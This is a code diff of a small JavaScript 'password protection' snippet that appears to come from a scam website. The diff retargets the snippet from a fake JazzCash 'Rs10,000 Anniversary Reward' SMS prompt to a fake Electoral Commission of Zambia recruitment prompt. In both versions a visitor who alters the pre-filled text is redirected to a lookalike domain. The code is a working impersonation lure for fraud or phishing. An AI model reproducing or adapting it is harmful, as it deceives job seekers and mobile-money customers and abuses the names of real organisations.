@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'Rs10,000'
-password=prompt('SMS: Welcome to jazzcash Rs10,000 Anniversary Reward, Kindly Press OK to PROCEED ','Rs10,000');
-if (password != 'Rs10,000') {
-location.href='https://jazzcash.allprograms.xyz/Gift';
+var password = 'ECZ Recruitment'
+password=prompt('SMS: Welcome to Electoral Commission of Zambia (ECZ), Kindly Press OK to PROCEED ','ECZ Recruitment');
+if (password != 'ECZ Recruitment') {
+location.href='https://ecz-career.alloffer.org/staff';
 
 }
